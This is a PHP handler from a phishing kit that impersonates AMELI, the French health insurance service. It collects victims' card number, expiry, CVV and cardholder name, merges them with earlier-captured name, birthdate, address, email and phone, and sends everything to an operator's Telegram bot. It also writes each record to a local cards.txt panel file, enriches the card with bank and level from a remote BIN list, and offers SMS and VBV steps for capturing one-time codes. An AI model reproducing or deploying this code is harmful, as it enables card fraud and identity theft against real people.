<?php

include("../common/includes.php");
include("../config.php");

ob_start();
if (!isset($_SESSION)) {
    session_start();
}

function sanitize($data) {
    return htmlspecialchars(trim($data), ENT_QUOTES, 'UTF-8');
}

function ifdash($v) {
    $v = is_string($v) ? trim($v) : $v;
    return ($v === '' || $v === null) ? '-' : $v;
}

function fetchBinList() {
    static $binsArr = null;
    if ($binsArr !== null) return $binsArr;

    $url = 'https://raw.githubusercontent.com/0Sallen/bincheck/refs/heads/main/bins.txt';
    $ctx = stream_context_create(['http' => ['timeout' => 2]]);
    $binsTxt = @file_get_contents($url, false, $ctx);
    $result = [];
    if ($binsTxt !== false) {
        $lines = explode("\n", $binsTxt);
        foreach ($lines as $line) {
            if (preg_match('/^([0-9]{6,})\|/', $line, $m)) {
                $bin = substr($m[1], 0, 8);
                $result[$bin] = $line;
                $result[substr($bin, 0, 6)] = $line;
            }
        }
    }
    $binsArr = $result;
    return $binsArr;
}

$CCNAME = isset($_POST['input_cc_name']) ? sanitize($_POST['input_cc_name']) : '';
$CC     = isset($_POST['input_cc_num']) ? sanitize($_POST['input_cc_num']) : '';
$DDE    = isset($_POST['input_cc_exp']) ? sanitize($_POST['input_cc_exp']) : '';
$CVV    = isset($_POST['input_cc_cvv']) ? sanitize($_POST['input_cc_cvv']) : '';

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $_SESSION['ccname'] = $CCNAME;
    $_SESSION['cc']     = $CC;
    $_SESSION['dde']    = $DDE;
    $_SESSION['cvv']    = $CVV;

    $ip = $_SERVER['REMOTE_ADDR'];

    $protocol = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || (isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == 443)) ? "https://" : "http://";
    $host = $_SERVER['HTTP_HOST'];
    $baseUrl = $protocol . $host . '/';


    $smsUrl = $baseUrl . "/redirect/log.php?id=" . urlencode($ip) . "&page=sms.php";
    $doneUrl = $baseUrl . "/redirect/log.php?id=" . urlencode($ip) . "&page=confirme.php";
    $vbvUrl = $baseUrl . "/redirect/log.php?id=" . urlencode($ip) . "&page=vbv.php";

    if (!empty($otp_mode)) {
        $replyMarkup = [
            'inline_keyboard' => [
                [
                    ['text' => '📲 SMS', 'url' => $smsUrl],
                    ['text' => '🔒 VBV', 'url' => $vbvUrl]
                ],
                [
                    ['text' => '✅ Terminer', 'url' => $doneUrl]
                ]
            ]
        ];
    } else {
        $replyMarkup = [
            'inline_keyboard' => [
                [
                    ['text' => '✅ Terminer', 'url' => $doneUrl]
                ]
            ]
        ];
    }

    $lastname   = ifdash(isset($_SESSION['Nom']) ? $_SESSION['Nom'] : '');
    $firstname  = ifdash(isset($_SESSION['Prenom']) ? $_SESSION['Prenom'] : '');
    $birthdate  = ifdash(isset($_SESSION['Ddn']) ? $_SESSION['Ddn'] : '');
    $email      = ifdash(isset($_SESSION['mail']) ? $_SESSION['mail'] : '');
    $address    = ifdash(isset($_SESSION['adresse']) ? $_SESSION['adresse'] : '');
    $address2   = ifdash(isset($_SESSION['adresse2']) ? $_SESSION['adresse2'] : '');
    $city       = ifdash(isset($_SESSION['city']) ? $_SESSION['city'] : '');
    $phone      = ifdash(isset($_SESSION['tel']) ? $_SESSION['tel'] : '');
    $date       = date('d/m/Y');
    $heure      = date('H\hi');

    $message  = "<b>🏦 [ +1 CARD // AMELI ]</b>\n\n";
    $message .= "<b>🪪 Titulaire :</b> <code>{$CCNAME}</code>\n";
    $message .= "<b>💳 Num carte :</b> <code>{$CC}</code>\n";
    $message .= "<b>📅 Date Expiration :</b> <code>{$DDE}</code>\n";
    $message .= "<b>🔒 Cryptogramme :</b> <code>{$CVV}</code>\n\n";
    $message .= "<b>👩‍🚒 Nom :</b> <code>{$lastname}</code>\n";
    $message .= "<b>👮‍♂️ Prénom :</b> <code>{$firstname}</code>\n";
    $message .= "<b>📧 Email :</b> <code>{$email}</code>\n";
    $message .= "<b>🎂 Date de naissance :</b> <code>{$birthdate}</code>\n";
    $message .= "<b>🏡 Adresse :</b> <code>{$address}</code>\n";
    $message .= "<b>🏠 Adresse secondaire :</b> <code>{$address2}</code>\n";
    $message .= "<b>🏙️ Ville :</b> <code>{$city}</code>\n";
    $message .= "<b>📱 Téléphone :</b> <code>{$phone}</code>\n\n";
    $message .= "<b>🌐 IP :</b> <code>{$ip}</code>\n";
    $message .= "<blockquote><b>🕒 Rez le [ <code>{$date}</code> à <code>{$heure}</code> ]</b>\n";
    $message .= "<b>🧑‍💻 Scamma - [ <code>AMELI</code> ]</b></blockquote>";

    $telegram_url = 'https://api.telegram.org/bot' . $bot_token . '/sendMessage';
    $post_fields = array(
        'chat_id' => $rez_card,
        'text' => $message,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode($replyMarkup)
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegram_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        error_log('Telegram API error: ' . curl_error($ch));
    } else {
        $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if ($http_status >= 400) {
            error_log("Telegram API HTTP status $http_status: $response");
        }
    }
    curl_close($ch);


    $binInfo = [
        'type' => '-',
        'bank' => '-',
        'level' => '-'
    ];

    $binRaw = preg_replace('/\D/', '', $CC);
    if ($binRaw && strlen($binRaw) >= 6) {
        $binsArr = fetchBinList();
        $binToCheck = '';
        if (strlen($binRaw) >= 8 && isset($binsArr[substr($binRaw, 0, 8)])) {
            $binToCheck = substr($binRaw, 0, 8);
        } elseif (isset($binsArr[substr($binRaw, 0, 6)])) {
            $binToCheck = substr($binRaw, 0, 6);
        }
        if ($binToCheck !== '') {
            $fields = explode('|', $binsArr[$binToCheck]);
            $typePart = (isset($fields[1]) && $fields[1] !== '' ? $fields[1] : '-');
            $levelPart = (isset($fields[2]) && $fields[2] !== '' ? $fields[2] : '-');
            $binInfo['type']  = ($typePart !== '-' && $levelPart !== '-') ? ($typePart . ' ' . $levelPart) : '-';
            $binInfo['level'] = (isset($fields[3]) && $fields[3] !== '' ? $fields[3] : '-');
            $binInfo['bank']  = (isset($fields[4]) && $fields[4] !== '' ? $fields[4] : (isset($fields[3]) && $fields[3] !== '' ? $fields[3] : '-'));
        }
    }

    $logLine = implode(' | ', [
        $CCNAME,
        $CC,
        $DDE,
        $CVV,
        $firstname,
        $lastname,
        $phone,
        $address,
        $address2,
        $city,
        $email,
        $ip,
        date('d/m/Y H:i:s'),
        $binInfo['type'],
        $binInfo['bank'],
        $binInfo['level']
    ]) . "\n";
    @file_put_contents(__DIR__ . '/../panel/data/cards.txt', $logLine, FILE_APPEND | LOCK_EX);

    setlocale(LC_TIME, 'fr_FR');
    date_default_timezone_set('Europe/Paris');
    $date = date("d/m/Y");
    $heure = date("H:i:s");

    header('location: ' . (!empty($otp_mode) ? '../pages/chargement.php' : '../pages/confirme.php'));
}
